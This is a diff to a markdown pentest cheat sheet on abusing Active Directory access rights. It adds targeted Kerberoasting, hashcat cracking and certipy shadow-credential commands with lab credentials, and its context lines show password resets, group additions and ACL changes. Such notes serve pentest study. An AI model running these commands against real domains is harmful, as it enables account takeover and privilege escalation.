@@ -15,13 +15,11 @@
 >
 > Only the access control lists that define the degree of access for users and groups are called DACLs.
 
-### List
-
-#### **GenericAll**
+### **GenericAll**
 
 Full rights to the object (add users to a group or reset user's password)
 
-**on User**
+#### **on User**
 
 1. **Change the password** of the user:
 
@@ -54,11 +52,30 @@ python3 targetedKerberoast.py -domain.local -u <username> -p password -v
 Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
 ```
 
-#### **GenericWrite**
+### **GenericWrite**
 
 Update object's attributes (i.e logon script)
 
-**on Group**
+#### on User
+
+This could be abuse with 3 different technics :
+
+* shadowCredentials (windows server 2016 or +)
+* **targetKerberoasting** (password should be weak enough to be cracked)
+* logonScript (this need a user connection and to be honest it never worked or unless with a script already inside sysvol)
+
+```bash
+# targetKerberoast
+targetedKerberoast.py -v -d sevenkingdoms.local -u jaime.lannister -p pasdebraspasdechocolat --request-user joffrey.baratheon
+
+# crack hash
+hashcat -m 13100 -a 0 joffrey.hash rockyou.txt --force
+
+# shadow credentials
+certipy shadow auto -u jaime.lannister@sevenkingdoms.local -p 'pasdebraspasdechocolat' -account 'joffrey.baratheon'
+```
+
+#### **on Group**
 
 Claire has GenericWrite over backups-admins group
 
@@ -67,11 +84,11 @@ Claire has GenericWrite over backups-admins group
 net group backup-admins claire /add
 ```
 
-#### **WriteOwner**
+### **WriteOwner**
 
 Change object owner to attacker controlled user take over the object
 
-**on User**
+#### **on User**
 
 Tom has WriteOwner on Claire
 
@@ -82,11 +99,11 @@ $cred = ConvertTo-SecureString "qwer1234QWER!@#$" -AsPlainText -force
 Set-DomainUserPassword -identity claire -accountpassword $cred
 ```
 
-#### **WriteDACL**
+### **WriteDACL**
 
 Modify object's ACEs and give attacker full control right over the object
 
-**on User**
+#### **on User**
 
 You can add new ACLs
 
@@ -94,7 +111,7 @@ You can add new ACLs
 Add-DomainObjectAcl -TargetIdentity claire -PrincipalIdentity tom -Rights ResetPassword
 ```
 
-#### **ForceChangePassword**
+### **ForceChangePassword**
 
 Ability to change user's password
 
@@ -109,7 +126,7 @@ rpcclient -U KnownUsername 10.10.10.192
 setuserinfo2 UsernameChange 23 'ComplexP4ssw0rd!'
 ```
 
-#### **Self**
+### **Self**
 
 Another privilege that enables the attacker adding themselves to a group.
 
